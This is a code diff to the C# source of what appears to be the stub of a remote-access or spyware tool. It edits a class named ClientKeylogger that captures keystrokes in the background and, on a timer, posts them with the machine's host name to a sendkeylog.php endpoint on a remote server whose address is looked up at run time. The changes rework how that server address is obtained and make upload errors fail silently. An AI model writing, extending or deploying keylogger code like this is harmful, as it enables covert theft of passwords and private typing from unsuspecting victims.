@@ -19,10 +19,7 @@ namespace stub
 
     internal class ClientKeylogger
     {
-        static WebClient webclient = WebClientHandler.wcReturn();
         static bool isStarted = false;
-
-
 
         private static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
         static System.Timers.Timer timer = new System.Timers.Timer();
@@ -64,6 +61,7 @@ namespace stub
             th_doKeylogger = new Thread(new ThreadStart(DoKeylogger));
             th_doKeylogger.SetApartmentState(ApartmentState.STA);
             th_doKeylogger.Start();
+
         }
 
         public static void StartKeylogger()
@@ -257,22 +255,18 @@ namespace stub
         }
 
 
-        
+
         static void onTimedEvent(object sender, EventArgs e)
         {
             if (!isStarted) return;
             try
             {
-                webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                webclient.UploadString("http://" + MutexHandler.appNameReturn() + "/sendkeylog.php", "client=" + Dns.GetHostName() + "&keylog=" + GetKeystrokes());
+                WebClientHandler.wcReturn().Headers.Add("Content-Type", "application/x-www-form-urlencoded");
+                WebClientHandler.wcReturn().UploadString("http://" + ConnectionIPHandler.GetIP() + "/sendkeylog.php", "client=" + Dns.GetHostName() + "&keylog=" + GetKeystrokes());
             }
-            catch (Exception)
-            {
-                System.Threading.Thread.Sleep(5000);
-            }
-        }
+            catch { }
 
-        
+        }
         public static string GetKeystrokes()
         {
             string filePath = path;
